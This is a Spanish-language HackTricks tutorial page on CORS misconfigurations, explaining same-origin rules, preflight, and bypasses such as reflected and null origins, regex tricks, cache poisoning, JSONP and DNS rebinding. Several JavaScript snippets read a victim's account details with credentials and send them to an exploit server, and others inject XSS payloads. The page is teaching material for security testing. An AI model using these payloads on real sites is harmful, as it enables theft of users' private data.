# CORS - Configuraciones incorrectas y bypass

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## ¬øQu√© es CORS?

El est√°ndar CORS (Cross-origin resource sharing) es necesario porque **permite a los servidores especificar qui√©n puede acceder a sus activos** y qu√© **m√©todos de solicitud HTTP est√°n permitidos** desde recursos externos.

Una pol√≠tica de **mismo origen**, requiere que tanto el **servidor que solicita** un recurso como el servidor donde se encuentra el **recurso** utilicen el mismo protocolo ([http://),dominio](http://\),dominio) (internal-web.com) y el mismo **puerto** (80). Entonces, si el servidor impone la pol√≠tica de mismo origen, solo las p√°ginas web del mismo dominio y puerto podr√°n acceder a los recursos.

La siguiente tabla muestra c√≥mo se aplicar√≠a la pol√≠tica de mismo origen en `http://normal-website.com/example/example.html` :

| URL accedida                              | ¬øAcceso permitido?                 |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | S√≠: mismo esquema, dominio y puerto|
| `http://normal-website.com/example2/`     | S√≠: mismo esquema, dominio y puerto|
| `https://normal-website.com/example/`     | No: esquema y puerto diferentes    |
| `http://en.normal-website.com/example/`   | No: dominio diferente              |
| `http://www.normal-website.com/example/`  | No: dominio diferente              |
| `http://normal-website.com:8080/example/` | No: puerto diferente*              |

\*_Internet Explorer permitir√° este acceso porque IE no tiene en cuenta el n√∫mero de puerto al aplicar la pol√≠tica de mismo origen._

### Cabecera `Access-Control-Allow-Origin`

La especificaci√≥n de `Access-Control-Allow-Origin` permite **m√∫ltiples or√≠genes**, o el valor **`null`**, o el comod√≠n **`*`**. Sin embargo, **ning√∫n navegador admite m√∫ltiples or√≠genes** y hay **restricciones** en el uso del comod√≠n **`*`**.(_El comod√≠n solo puede usarse solo, esto fallar√° `Access-Control-Allow-Origin: https://*.normal-website.com` y no se puede usar con_ _Access-Control-Allow-Credentials: true_)

Esta cabecera es **devuelta por un servidor** cuando un sitio web solicita un recurso de otro dominio, con una cabecera `Origin` a√±adida por el navegador.

### Cabecera `Access-Control-Allow-Credentials`

El comportamiento **predeterminado** de las solicitudes de recursos de otro origen es que las **solicitudes** se **env√≠en sin credenciales** como cookies y la cabecera de Autorizaci√≥n. Sin embargo, el servidor de otro dominio puede **permitir la lectura** de la **respuesta** cuando las **credenciales** se **env√≠an** a √©l estableciendo la cabecera CORS **`Access-Control-Allow-Credentials`** en **`true`**.

Si el valor se establece en `true`, entonces el navegador enviar√° credenciales (cookies, cabeceras de autorizaci√≥n o certificados de cliente TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Solicitud de pre-vuelo

Bajo ciertas circunstancias, cuando una solicitud entre dominios:

* incluye un **m√©todo HTTP no est√°ndar (HEAD, GET, POST)**
* incluye **headers nuevos**
* incluye un valor especial en el **header Content-Type**

{% hint style="info" %}
**Verifica** [**en este enlace**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **las condiciones de una solicitud para evitar el env√≠o de una solicitud de pre-vuelo**
{% endhint %}

la solicitud entre or√≠genes es precedida por una **solicitud** utilizando el m√©todo **`OPTIONS`**, y el protocolo CORS requiere una verificaci√≥n inicial sobre qu√© **m√©todos y headers est√°n permitidos antes de permitir la solicitud entre or√≠genes**. Esto se denomina la **verificaci√≥n de pre-vuelo**. El servidor **devuelve una lista de m√©todos permitidos** adem√°s del **origen de confianza** y el navegador verifica si el m√©todo del sitio web solicitante est√° permitido.

{% hint style="danger" %}
Ten en cuenta que **incluso si no se env√≠a una solicitud de pre-vuelo** porque se respetan las condiciones de la "solicitud regular", la **respuesta necesita tener los headers de autorizaci√≥n** o el **navegador** **no podr√° leer la respuesta** de la solicitud.
{% endhint %}

Por **ejemplo**, esta es una solicitud de pre-vuelo que busca **usar el m√©todo `PUT`** junto con un **header** de solicitud **personalizado** llamado `Special-Request-Header`:
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
El servidor podr√≠a devolver una respuesta como la siguiente:
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` Cabeceras permitidas
* `Access-Control-Expose-Headers`
* `Access-Control-Max-Age` Define un marco de tiempo m√°ximo para el almacenamiento en cach√© de la respuesta de pre-vuelo para su reutilizaci√≥n
* `Access-Control-Request-Headers` La cabecera que la solicitud de origen cruzado quiere enviar
* `Access-Control-Request-Method` El m√©todo que la solicitud de origen cruzado quiere utilizar
* `Origin` Origen de la solicitud de origen cruzado (Establecido autom√°ticamente por el navegador)

![](../.gitbook/assets/preflight.svg)

Tenga en cuenta que normalmente (dependiendo del content-type y las cabeceras establecidas) en una solicitud **GET/POST no se env√≠a una solicitud de pre-vuelo** (la solicitud se env√≠a **directamente**), pero si desea acceder a las **cabeceras/cuerpo de la respuesta**, debe contener una cabecera _Access-Control-Allow-Origin_ que lo permita.\
**Por lo tanto, CORS no protege contra CSRF (pero puede ser √∫til).**

### **Solicitud de pre-vuelo de peticiones de red local**

Cuando se env√≠a una solicitud a una direcci√≥n IP de red local, se env√≠an 2 cabeceras CORS adicionales:

* La cabecera de solicitud del cliente `Access-Control-Request-Local-Network` indica que la solicitud es una petici√≥n de red local
* La cabecera de respuesta del servidor `Access-Control-Allow-Local-Network` indica que un recurso puede compartirse de manera segura con redes externas

Una **respuesta v√°lida que permite la solicitud de red local** necesita tener tambi√©n en la respuesta la cabecera `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Tenga en cuenta que la IP **0.0.0.0** de linux funciona para **bypass** estos requisitos para acceder a localhost ya que esa direcci√≥n IP no se considera "local".

Tambi√©n es posible **bypass los requisitos de Red Local** si usa la **direcci√≥n IP p√∫blica de un punto final local** (como la IP p√∫blica del router). Porque en varias ocasiones, incluso si se accede a la **IP p√∫blica**, si es **desde la red local**, se conceder√° acceso.


{% endhint %}

## Configuraciones explotables

Note que la mayor√≠a de los **ataques reales requieren que `Access-Control-Allow-Credentials`** est√© configurado en **`true`** porque esto permitir√° que el navegador env√≠e las credenciales y lea la respuesta. Sin credenciales, muchos ataques se vuelven irrelevantes; significa que no puedes aprovechar las cookies de un usuario, por lo que a menudo no hay nada que ganar haciendo que su navegador emita la solicitud en lugar de emitirla t√∫ mismo.

Una excepci√≥n notable es cuando la **ubicaci√≥n de red de la v√≠ctima funciona como una especie de autenticaci√≥n.** Puedes usar el navegador de una v√≠ctima como un proxy para bypass la autenticaci√≥n basada en IP y acceder a aplicaciones de intranet. En t√©rminos de impacto, esto es similar a DNS rebinding, pero mucho menos complicado de explotar.

### `Origin` reflejado en `Access-Control-Allow-Origin`

En el mundo real esto no puede suceder ya que **estos 2 valores de los encabezados est√°n prohibidos juntos**.\
Tambi√©n es cierto que muchos desarrolladores quieren **permitir varias URLs en el CORS**, pero no se permiten comodines de subdominios o listas de URLs. Entonces, varios desarrolladores **generan** el encabezado \*\*`Access-Control-Allow-Origin`\*\* **din√°micamente**, y en m√°s de una ocasi√≥n simplemente **copian el valor del encabezado Origin**.

En ese caso, se podr√≠a explotar **la misma vulnerabilidad.**

En otros casos, el desarrollador podr√≠a verificar que el **dominio** (_victimdomain.com_) **aparezca** en el encabezado **Origin**, entonces, un atacante puede usar un dominio llamado **`attackervictimdomain.com`** para robar la informaci√≥n confidencial.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### El origen `null`

`null` es un valor especial para el encabezado **Origin**. La especificaci√≥n menciona que se activa por redirecciones y archivos HTML locales. Algunas aplicaciones podr√≠an incluir en la lista blanca el origen `null` para apoyar el desarrollo local de la aplicaci√≥n.\
Esto es bueno porque **varias aplicaciones permitir√°n este valor** dentro de CORS y cualquier **sitio web puede obtener f√°cilmente el origen null utilizando un iframe con sandbox**:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **Regexp bypasses**

Si descubres que el dominio _victim.com_ est√° **en la lista blanca**, deber√≠as verificar si _victim.com.**attacker.com**_ tambi√©n est√° **en la lista blanca**, o, en caso de que puedas **tomar control de alg√∫n subdominio**, comprueba si _**somesubdomain**.victim.com_ est√° en la lista blanca.

### **Avances en bypasses de Regexp**

La mayor√≠a de las regex utilizadas para identificar el dominio dentro de la cadena se centrar√°n en caracteres ASCII alfanum√©ricos y `.-`. Entonces, algo como `victimdomain.com{.attacker.com` dentro del encabezado Origin ser√° interpretado por la regexp como si el dominio fuera `victimdomain.com`, pero el navegador (en este caso Safari soporta este car√°cter en el dominio) acceder√° al dominio `attacker.com`.

¬°El car√°cter `_` (en subdominios) no solo es compatible con Safari, sino tambi√©n con Chrome y Firefox!

**Entonces, utilizando uno de esos subdominios podr√≠as eludir algunas regex "comunes" para encontrar el dominio principal de una URL.**

**Para m√°s informaci√≥n y configuraciones de este bypass consulta:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **y** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### Desde XSS dentro de un subdominio

Un mecanismo defensivo que utilizan los desarrolladores contra la explotaci√≥n de CORS es incluir en la lista blanca dominios que solicitan acceso frecuentemente a la informaci√≥n. Sin embargo, esto no es completamente seguro, porque si incluso **uno** de los subdominios del dominio **en la lista blanca** es **vulnerable** a otros exploits como **XSS**, puede habilitar la explotaci√≥n de CORS.

Consideremos un ejemplo, el siguiente c√≥digo muestra la configuraci√≥n que permite a los subdominios de _requester.com_ acceder a recursos de _provider.com_.
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
### **Envenenamiento de cach√© del lado del servidor**

Si las estrellas est√°n alineadas, podr√≠amos utilizar el envenenamiento de cach√© del lado del servidor a trav√©s de la inyecci√≥n de cabeceras HTTP para crear una vulnerabilidad de [XSS almacenado](https://portswigger.net/web-security/cross-site-scripting/stored).

Si una aplicaci√≥n **refleja** la cabecera **Origin** sin siquiera verificarla en busca de caracteres ilegales como , efectivamente tenemos una **vulnerabilidad de inyecci√≥n de cabeceras HTTP contra usuarios de IE/Edge ya que Internet Explorer y Edge consideran \r (0x0d) como un terminador de cabecera HTTP v√°lido**:`GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorer ve la respuesta como:

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

Esto no es directamente explotable porque no hay forma de que un atacante haga que el navegador web de alguien env√≠e una cabecera malformada, pero puedo **crear manualmente esta solicitud en Burp Suite y una cach√© del lado del servidor puede guardar la respuesta y servirla a otras personas**. El payload que he utilizado cambiar√° el conjunto de caracteres de la p√°gina a **UTF-7**, que es notoriamente √∫til para crear vulnerabilidades XSS.

### **Envenenamiento de cach√© del lado del cliente**

Es posible que ocasionalmente te hayas encontrado con una p√°gina con [XSS reflejado](https://portswigger.net/web-security/cross-site-scripting/reflected) en una cabecera HTTP personalizada. Digamos que una p√°gina web refleja el contenido de una cabecera personalizada sin codificar:
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
Con CORS, podemos enviar cualquier valor en el Header. Por s√≠ mismo, **eso es in√∫til** ya que la respuesta que contiene nuestro **JavaScript inyectado no se renderizar√°**. Sin embargo, **si no se ha especificado Vary: Origin**, la respuesta **puede almacenarse en la cach√© del navegador y mostrarse directamente cuando el navegador navegue a la URL asociada**. He creado un fiddle para [intentar este ataque en una URL de tu elecci√≥n](https://jsfiddle.net/3gk8u8wu/3/). Dado que este ataque utiliza la cach√© del lado del cliente, es bastante confiable.
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI designa un tipo de vulnerabilidad que explota el hecho de que, cuando un recurso se incluye usando la etiqueta `script`, la pol√≠tica de SOP no se aplica, porque los scripts deben poder incluirse entre dominios. Un atacante puede as√≠ leer todo lo que se incluy√≥ usando la etiqueta `script`.

Esto es especialmente interesante cuando se trata de JavaScript din√°mico o JSONP cuando se utilizan informaciones de autoridad ambiental como las cookies para autenticaci√≥n. Las cookies se incluyen al solicitar un recurso de un host diferente. Plugin de BurpSuite: [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**Lee m√°s sobre los diferentes tipos de XSSI y c√≥mo explotarlos aqu√≠.**](xssi-cross-site-script-inclusion.md)

Intenta agregar un **par√°metro `callback`** en la solicitud. Tal vez la p√°gina estaba preparada para enviar los datos como JSONP. En ese caso, la p√°gina enviar√° los datos con `Content-Type: application/javascript` lo cual evadir√° la pol√≠tica de CORS.

![](<../.gitbook/assets/image (229).png>)

### Bypass f√°cil (¬øin√∫til?)

Puedes pedirle a una aplicaci√≥n web que haga una solicitud por ti y te env√≠e la respuesta. Esto evadir√° el **`Access-Control-Allow-Origin`** pero ten en cuenta que las **credenciales para la v√≠ctima final no se enviar√°n** ya que estar√°s **contactando un dominio diferente** (el que har√° la solicitud por ti).

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape proporciona un **proxy** que **pasa** nuestra **solicitud** junto con sus **encabezados**, y tambi√©n **falsifica** el encabezado **Origin** (Origin = **dominio solicitado**). As√≠ que la **pol√≠tica de CORS se evita**.\
El c√≥digo fuente est√° [en Github](https://github.com/shalvah/cors-escape), as√≠ que puedes **alojar el tuyo propio**.
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

El proxy es como "pasar" tu solicitud, exactamente como la enviaste. Podr√≠amos resolver esto de una manera alternativa que a√∫n implica que alguien m√°s haga la solicitud por ti, pero esta vez, **en lugar de pasar tu solicitud, el servidor hace su propia solicitud, pero con los par√°metros que especificaste.**

### Iframe + Popup Bypass

Puedes **burlar las comprobaciones de CORS** como `e.origin === window.origin` **creando un iframe** y **desde √©l abriendo una nueva ventana**. M√°s informaci√≥n en la siguiente p√°gina:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

B√°sicamente haces que la **v√≠ctima acceda a tu p√°gina**, luego cambias el **DNS de tu dominio (la IP)** y haces que **apunte** a la **p√°gina web de tu v√≠ctima**. Haces que tu **v√≠ctima ejecute** (**JS**) algo cuando el **TTL se acabe** para que se realice una nueva solicitud de DNS y entonces podr√°s recopilar la informaci√≥n (ya que siempre mantendr√°s **al usuario en tu dominio**, no enviar√° **ninguna cookie** al servidor de la v√≠ctima, por lo que esta opci√≥n **abusa de los privilegios especiales de la IP de la v√≠ctima**).

Incluso si configuras el **TTL muy bajo** (0 o 1), los **navegadores tienen una cach√©** que te **impedir√°** **abusar** de esto durante varios segundos/minutos.

Por lo tanto, esta t√©cnica es √∫til para **burlar comprobaciones expl√≠citas** (la v√≠ctima est√° **realizando expl√≠citamente una solicitud de DNS** para verificar la IP del dominio y cuando se llama al bot, √©l har√° su propia solicitud).

O cuando puedes tener a un **usuario/bot en la misma p√°gina durante mucho tiempo** (as√≠ puedes **esperar** hasta que la **cach√© expire**).

Si necesitas algo r√°pido para abusar de esto puedes usar un servicio como [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Si quieres ejecutar tu propio servidor de DNS rebinding puedes usar algo como [**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**,** luego **exponer** tu **puerto local 53/udp**, crear un **registro A apuntando a √©l** (ns.example.com), y crear un **registro NS** apuntando al **subdominio A creado previamente**(ns.example.com).\
Entonces, cualquier subdominio de ese subdominio (ns.example.com), ser√° resuelto por tu host.

Consulta tambi√©n el **servidor p√∫blico en funcionamiento en** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

### DNS Rebinding via **Inundaci√≥n de Cach√© de DNS**

Como se explic√≥ en la secci√≥n anterior, los **navegadores** tienen las IPs de los dominios **en cach√© m√°s tiempo** del especificado en el TTL. Sin embargo, hay una forma de burlar esta defensa.

Puedes tener un service worker que **inunde la cach√© de DNS para forzar una segunda solicitud de DNS**. Entonces el flujo ser√° como sigue:

1. Solicitud de DNS respondida con direcci√≥n del atacante
2. Service worker inunda la cach√© de DNS (se elimina el nombre del servidor atacante en cach√©)
3. Segunda solicitud de DNS esta vez respondida con 127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_El azul es la primera solicitud de DNS y el naranja es la inundaci√≥n._

### DNS Rebinding via **Cach√©**

Como se explic√≥ en la secci√≥n anterior, los **navegadores** tienen las IPs de los dominios **en cach√© m√°s tiempo** del especificado en el TTL. Sin embargo, hay otra forma de burlar esta defensa.

Puedes **crear 2 registros A** (o **1 con 2 IPs**, dependiendo del proveedor) para el **mismo subdominio** en el **proveedor de DNS** y cuando un navegador los verifique, obtendr√° ambos.

Ahora, si el **navegador** decide **usar primero la direcci√≥n IP del atacante**, el **atacante** podr√° **servir** el **payload** que **realizar√° solicitudes HTTP** al mismo **dominio**. Sin embargo, ahora que el atacante conoce la IP de la v√≠ctima, **dejar√° de responder al navegador de la v√≠ctima**.

Cuando el navegador descubre que el **dominio no le est√° respondiendo**, **usar√° la segunda IP dada**, por lo que **acceder√° a un lugar diferente burlando SOP**. El atacante puede abusar de eso para **obtener la informaci√≥n y exfiltrarla**.

{% hint style="warning" %}
Ten en cuenta que para acceder a localhost deber√≠as intentar reasignar **127.0.0.1** en Windows y **0.0.0.0** en Linux.\
Proveedores como godaddy o cloudflare no me permitieron usar la ip 0.0.0.0, pero AWS route53 me permiti√≥ crear un registro A con 2 IPs siendo una de ellas "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

Para m√°s informaci√≥n puedes consultar [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Otras Burlas Comunes

* Si **no se permiten IPs internas**, podr√≠an **olvidar prohibir 0.0.0.0** (funciona en Linux y Mac)
* Si **no se permiten IPs internas**, responde con un **CNAME** a **localhost** (funciona en Linux y Mac)
* Si **no se permiten IPs internas** como respuestas de DNS, puedes responder con **CNAMEs a servicios internos** como www.corporate.internal.

### DNS Rebidding Armado

Puedes encontrar m√°s informaci√≥n sobre las t√©cnicas de burla anteriores y c√≥mo usar la siguiente herramienta en la charla [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) es una herramienta para realizar ataques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Incluye los componentes necesarios para reasignar la direcci√≥n IP del nombre de DNS del servidor de ataque a la direcci√≥n IP de la m√°quina objetivo y para servir payloads de ataque para explotar software vulnerable en la m√°quina objetivo.

### Protecci√≥n Real contra DNS Rebinding

* Usa TLS en servicios internos
* Solicita autenticaci√≥n para acceder a datos
* Valida el encabezado Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Propuesta para enviar siempre una solicitud previa cuando los servidores p√∫blicos quieran acceder a servidores internos

## **Herramientas**

**Fuzz posibles malas configuraciones en pol√≠ticas de CORS**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Referencias

{% embed url="https://portswigger.net/web-security/cors" %}

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" %}

{% embed url="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" %}

{% embed url="https://www.codecademy.com/articles/what-is-cors" %}

{% embed url="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" %}

{% embed url="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" %}

{% embed url="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
